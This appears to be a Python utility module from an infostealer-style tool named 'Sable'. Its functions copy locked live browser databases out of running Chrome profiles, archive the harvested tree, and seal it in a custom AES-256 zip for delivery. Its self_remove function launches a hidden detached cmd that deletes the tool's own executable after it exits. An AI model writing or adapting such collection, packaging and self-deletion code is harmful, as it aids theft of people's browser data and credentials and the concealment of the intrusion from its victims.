"""Filesystem and shell helpers shared by every collector.

Live browser databases are never opened in place. They are copied, together with
their ``-wal`` and ``-shm`` siblings, and the copy is what gets read. A profile that
is open in a running browser holds a lock on the original, and the write-ahead log
holds the rows the main file does not have yet.
"""

from __future__ import annotations

import json
import secrets
import shutil
import struct
import subprocess
import sys
import tempfile
import zipfile
import zlib
from collections.abc import Iterator
from contextlib import contextmanager
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Final

from . import log

_MAX_JSON_BYTES: Final[int] = 32 * 1024 * 1024
_MAX_ARCHIVE_FILES: Final[int] = 50_000
_SIDECARS: Final[tuple[str, ...]] = ("-wal", "-shm")

# Chrome stores microseconds since 1601-01-01; Unix epoch is 11644473600 s later.
_CHROME_EPOCH_OFFSET: Final[int] = 11_644_473_600

# The earliest timestamp a zip entry can carry. Anything older raises inside zipfile,
# and a copied profile is full of 1601-epoch files.
_ZIP_EPOCH: Final[tuple[int, int, int, int, int, int]] = (1980, 1, 1, 0, 0, 0)

_DETACHED_PROCESS: Final[int] = 0x00000008
_CREATE_NEW_PROCESS_GROUP: Final[int] = 0x00000200


def executable_path() -> Path:
    """The file to delete when self-remove runs: the frozen exe, or the script."""
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve()
    return Path(sys.argv[0]).resolve()


def copy_with_sidecars(source: Path, destination: Path) -> bool:
    """Copy a live database and its WAL siblings. False if the source is absent."""
    if not source.is_file():
        return False
    try:
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, destination)
    except OSError:
        log.logger.debug("copy failed: %s", source, exc_info=True)
        return False

    for suffix in _SIDECARS:
        sidecar = source.with_name(source.name + suffix)
        if not sidecar.is_file():
            continue
        try:
            shutil.copy2(sidecar, destination.with_name(destination.name + suffix))
        except OSError:
            # A missing sidecar costs recent rows, not the whole copy.
            log.logger.debug("sidecar copy failed: %s", sidecar, exc_info=True)
    return True


def read_json(path: Path) -> Any | None:
    """Parsed JSON, or None on absence, oversize or malformed content."""
    try:
        if path.stat().st_size > _MAX_JSON_BYTES:
            log.logger.debug("json too large: %s", path)
            return None
        with path.open("r", encoding="utf-8", errors="replace") as handle:
            return json.load(handle)
    except (OSError, ValueError):
        log.logger.debug("json read failed: %s", path, exc_info=True)
        return None


def write_json(path: Path, payload: Any) -> bool:
    """Write UTF-8 JSON with parents created. False on any failure."""
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, ensure_ascii=False, default=str)
    except (OSError, TypeError, ValueError):
        log.logger.debug("json write failed: %s", path, exc_info=True)
        return False
    return True


def write_text(path: Path, text: str) -> bool:
    """Write UTF-8 text with parents created. False on any failure."""
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    except OSError:
        log.logger.debug("text write failed: %s", path, exc_info=True)
        return False
    return True


def keep_archive(archive: Path, label: str, base: Path | None = None) -> Path | None:
    """Copy a finished archive to a folder a person can open.

    The default base is ``Documents\\Sable Results`` on the account running the
    artifact: the one folder on Windows that is both easy to find and normally
    writable. The label is reduced to letters, digits, dash and underscore so a
    hostname can never produce an illegal filename.

    Never raises. A locked profile costs the local copy, not the delivery.
    """
    folder = base if base is not None else Path.home() / "Documents" / "Sable Results"
    safe = "".join(
        character for character in label if character.isalnum() or character in "-_"
    )[:40] or "sable"
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")

    target = folder / f"{safe}_{stamp}.zip"
    try:
        folder.mkdir(parents=True, exist_ok=True)
        serial = 1
        while target.exists():
            target = folder / f"{safe}_{stamp}_{serial}.zip"
            serial += 1
        shutil.copy2(archive, target)
    except OSError:
        log.logger.debug("local archive copy failed", exc_info=True)
        return None
    return target


def chrome_time(value: int) -> str | None:
    """Chrome's microseconds-since-1601 as an ISO 8601 UTC string."""
    if value <= 0:
        return None
    try:
        stamp = datetime.fromtimestamp(value / 1_000_000 - _CHROME_EPOCH_OFFSET, tz=UTC)
    except (OverflowError, OSError, ValueError):
        return None
    return stamp.isoformat()


def unix_time(value: int) -> str | None:
    """Seconds since the Unix epoch as an ISO 8601 UTC string."""
    if value <= 0:
        return None
    try:
        stamp = datetime.fromtimestamp(value, tz=UTC)
    except (OverflowError, OSError, ValueError):
        return None
    return stamp.isoformat()


@contextmanager
def temp_workspace(prefix: str = "sable-") -> Iterator[Path]:
    """A temp directory that is removed even when the body raises."""
    path = Path(tempfile.mkdtemp(prefix=prefix))
    try:
        yield path
    finally:
        shutil.rmtree(path, ignore_errors=True)


def _iter_files(root: Path, limit: int = _MAX_ARCHIVE_FILES) -> Iterator[Path]:
    count = 0
    for path in root.rglob("*"):
        if count >= limit:
            log.logger.debug("archive file cap reached at %d", limit)
            return
        if not path.is_file():
            continue
        count += 1
        yield path


def make_archive(source: Path, destination: Path) -> Path | None:
    """Zip the collected tree. None when the source is gone or the zip cannot open.

    Members are written through an explicit ``ZipInfo`` rather than
    ``ZipFile.write``. ``write`` copies each file's mtime into the entry, and the zip
    format cannot represent anything before 1980 — it raises ``ValueError`` and takes
    the whole archive with it. Copied browser profiles contain exactly those
    timestamps: LevelDB and SQLite files written by an installer or unpacked from an
    image carry a 1601 epoch, which is Windows' zero and well before the format's
    floor. A fixed epoch also makes two runs over the same tree produce comparable
    members instead of recording when the copy happened.
    """
    if not source.is_dir():
        log.logger.debug("archive source is not a directory: %s", source)
        return None
    try:
        destination.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(destination, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for path in _iter_files(source):
                if path == destination:
                    continue
                try:
                    data = path.read_bytes()
                except OSError:
                    log.logger.debug("archive skipped: %s", path, exc_info=True)
                    continue

                info = zipfile.ZipInfo(path.relative_to(source).as_posix(), _ZIP_EPOCH)
                info.compress_type = zipfile.ZIP_DEFLATED
                info.external_attr = 0o600 << 16
                try:
                    archive.writestr(info, data)
                except (OSError, ValueError):
                    log.logger.debug("archive member refused: %s", path, exc_info=True)
    except OSError:
        log.logger.debug("archive creation failed: %s", destination, exc_info=True)
        return None
    return destination


def self_remove(executable: Path) -> None:
    """Detach a cmd that waits for this process to die, then deletes it.

    The path is quoted because a username with a space in it is not an edge case.

    The line is handed to ``CreateProcess`` as one string rather than as an argv list.
    ``subprocess`` re-quotes a list for ``CreateProcess``, escaping the embedded quotes
    of the path with backslashes — and ``cmd`` does not read backslashes as escapes, so
    the ``del`` ran against a mangled path and silently failed. Measured on a real
    artifact: the process detached, logged, exited clean, and the file was still there.

    A rename is tried before a delete because Windows permits renaming a running image
    while it refuses to delete one, and the renamed file is deleted a few seconds later
    once the handle is gone. Deletion is attempted more than once for the same reason:
    the image stays mapped briefly past process exit.
    """
    if sys.platform != "win32":
        return
    target = str(executable)
    if '"' in target:
        log.logger.warning("self-remove skipped: path contains a quote")
        return

    moved = target + ".old"
    command = (
        f'cmd /c ping -n 4 127.0.0.1 >nul'
        f' & move /y "{target}" "{moved}" >nul 2>&1'
        f' & ping -n 3 127.0.0.1 >nul'
        f' & del /f /q "{moved}" >nul 2>&1'
        f' & del /f /q "{moved}" >nul 2>&1'
        f' & del /f /q "{target}" >nul 2>&1'
    )
    try:
        subprocess.Popen(
            command,
            creationflags=_DETACHED_PROCESS | _CREATE_NEW_PROCESS_GROUP,
            close_fds=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        log.logger.debug("self-remove: detached for %s", target)
    except OSError:
        log.logger.debug("self-remove failed to spawn", exc_info=True)


# --- encrypted archive --------------------------------------------------------
#
# WinZip AES-256, which is what 7-Zip, WinRAR and PeaZip all read when a zip asks for a
# password. The alternative was the traditional ZipCrypto that skidded builders ship:
# one known-plaintext byte and the key falls out in minutes, so it looks like a lock and
# is not one. The stdlib can read this format but cannot write it, and the agent may not
# import ``core/``, so the writer lives here.
#
# Layout per entry, from the WinZip AES specification:
#   salt 16 | password verifier 2 | AES-256-CTR ciphertext | HMAC-SHA1 truncated to 10
# The counter is 16 bytes, little endian, starting at 1. Key material is 66 bytes of
# PBKDF2-HMAC-SHA1 over the password: 32 encryption, 32 authentication, 2 verifier.

_METHOD_AES: Final[int] = 99
_METHOD_STORE: Final[int] = 0
_METHOD_DEFLATE: Final[int] = 8
_AES_EXTRA_ID: Final[int] = 0x9901
_AES_VERSION: Final[int] = 2
_AES_VENDOR: Final[bytes] = b"AE"
_AES_STRENGTH: Final[int] = 3
_AES_SALT: Final[int] = 16
_AES_AUTH: Final[int] = 10
_AES_ITERATIONS: Final[int] = 1000
_AES_NEEDED: Final[int] = 51
_AES_FLAG: Final[int] = 0x0001
_CHUNK_SEAL: Final[int] = 1 << 20
# A counter is 16 bytes, so one AES call per counter would be 21 million calls for a
# 340 MB archive. Refilling 64 KiB of keystream per call divides that by 4096.
_CTR_BLOCKS: Final[int] = 4096


class _Counter:
    """AES-256 in the little-endian counter mode WinZip defined, applied in order."""

    def __init__(self, key: bytes) -> None:
        from Crypto.Cipher import AES

        self._aes = AES.new(key, AES.MODE_ECB)
        self._counter = 1
        self._stream = b""

    def _refill(self) -> None:
        start = self._counter
        blocks = b"".join(
            (start + index).to_bytes(16, "little") for index in range(_CTR_BLOCKS)
        )
        self._stream = self._aes.encrypt(blocks)
        self._counter = start + _CTR_BLOCKS

    def apply(self, data: bytes) -> bytes:
        if not data:
            return b""
        out = bytearray()
        index = 0
        while index < len(data):
            if not self._stream:
                self._refill()
            take = min(len(self._stream), len(data) - index)
            # Integer XOR keeps this off a per-byte Python loop.
            mask = int.from_bytes(self._stream[:take], "big")
            block = int.from_bytes(data[index:index + take], "big")
            out += (mask ^ block).to_bytes(take, "big")
            self._stream = self._stream[take:]
            index += take
        return bytes(out)


def _deflate(bundle: zipfile.ZipFile, info: zipfile.ZipInfo) -> bytes:
    """Raw deflate of one member, inside its own buffer.

    Storing instead would be simpler and would double the archive: the source zip holds
    a 338 MB tree in 182 MB, so an encrypted store-only copy came out at 340 MB and took
    123 s. Bounded by the largest single member, not by the archive.
    """
    engine = zlib.compressobj(9, zlib.DEFLATED, -15)
    parts: list[bytes] = []
    with bundle.open(info) as member:
        while True:
            block = member.read(_CHUNK_SEAL)
            if not block:
                break
            parts.append(engine.compress(block))
    parts.append(engine.flush())
    return b"".join(parts)


def _aes_extra(method: int) -> bytes:
    return struct.pack(
        "<HHH2sBH", _AES_EXTRA_ID, 7, _AES_VERSION, _AES_VENDOR, _AES_STRENGTH, method
    )


def _aes_keys(password: str, salt: bytes) -> tuple[bytes, bytes, bytes]:
    from Crypto.Hash import SHA1
    from Crypto.Protocol.KDF import PBKDF2

    material = PBKDF2(
        password.encode("utf-8"),
        salt,
        dkLen=32 + 32 + 2,
        count=_AES_ITERATIONS,
        hmac_hash_module=SHA1,
    )
    return material[:32], material[32:64], material[64:66]


def _dos_stamp(moment: tuple[int, int, int, int, int, int]) -> tuple[int, int]:
    year, month, day, hour, minute, second = moment
    year = min(max(year, 1980), 2107)
    return (
        (hour << 11) | (minute << 5) | (second // 2),
        ((year - 1980) << 9) | (month << 5) | day,
    )


def seal_zip(source: Path, destination: Path, password: str) -> Path | None:
    """Write ``source`` as a password-protected AES-256 zip. None on any failure.

    Each member is deflated first and then encrypted, so the encrypted file is roughly
    the size of the source rather than of the uncompressed tree.

    Never raises. A caller that loses the encrypted copy still has the plain one.
    """
    if not password:
        log.logger.debug("seal_zip called without a password")
        return None

    from Crypto.Hash import HMAC, SHA1

    try:
        with zipfile.ZipFile(source) as bundle, destination.open("wb") as handle:
            central: list[bytes] = []
            written = 0
            count = 0

            for info in bundle.infolist():
                if info.is_dir():
                    continue

                salt = secrets.token_bytes(_AES_SALT)
                encrypt_key, auth_key, verifier = _aes_keys(password, salt)
                counter = _Counter(encrypt_key)
                digest = HMAC.new(auth_key, digestmod=SHA1)

                name = info.filename.encode("utf-8")
                extra = _aes_extra(_METHOD_DEFLATE)
                clock, day = _dos_stamp(info.date_time)
                plain = info.file_size
                packed = _deflate(bundle, info)
                stored = _AES_SALT + len(verifier) + len(packed) + _AES_AUTH
                offset = written

                header = struct.pack(
                    "<4sHHHHHIIIHH",
                    b"PK\x03\x04",
                    _AES_NEEDED,
                    _AES_FLAG,
                    _METHOD_AES,
                    clock,
                    day,
                    0,  # AE-2 carries no CRC; the authentication code replaces it
                    stored,
                    plain,
                    len(name),
                    len(extra),
                )
                handle.write(header)
                handle.write(name)
                handle.write(extra)
                handle.write(salt)
                handle.write(verifier)
                written += len(header) + len(name) + len(extra) + len(salt) + len(verifier)

                for start in range(0, len(packed), _CHUNK_SEAL):
                    cipher = counter.apply(packed[start:start + _CHUNK_SEAL])
                    digest.update(cipher)
                    handle.write(cipher)
                    written += len(cipher)

                tag = digest.digest()[:_AES_AUTH]
                handle.write(tag)
                written += len(tag)

                central.append(
                    struct.pack(
                        "<4sHHHHHHIIIHHHHHII",
                        b"PK\x01\x02",
                        _AES_NEEDED,
                        _AES_NEEDED,
                        _AES_FLAG,
                        _METHOD_AES,
                        clock,
                        day,
                        0,
                        stored,
                        plain,
                        len(name),
                        len(extra),
                        0,
                        0,
                        0,
                        info.external_attr,
                        offset,
                    )
                    + name
                    + extra
                )
                count += 1

            directory_offset = written
            for record in central:
                handle.write(record)
                written += len(record)

            handle.write(
                struct.pack(
                    "<4sHHHHIIH",
                    b"PK\x05\x06",
                    0,
                    0,
                    count,
                    count,
                    written - directory_offset,
                    directory_offset,
                    0,
                )
            )
    except (OSError, ValueError, RuntimeError, KeyError, zipfile.BadZipFile):
        log.logger.debug("sealing the archive failed", exc_info=True)
        return None
    return destination


__all__ = [
    "chrome_time",
    "copy_with_sidecars",
    "executable_path",
    "keep_archive",
    "make_archive",
    "read_json",
    "seal_zip",
    "self_remove",
    "temp_workspace",
    "unix_time",
    "write_json",
    "write_text",
]
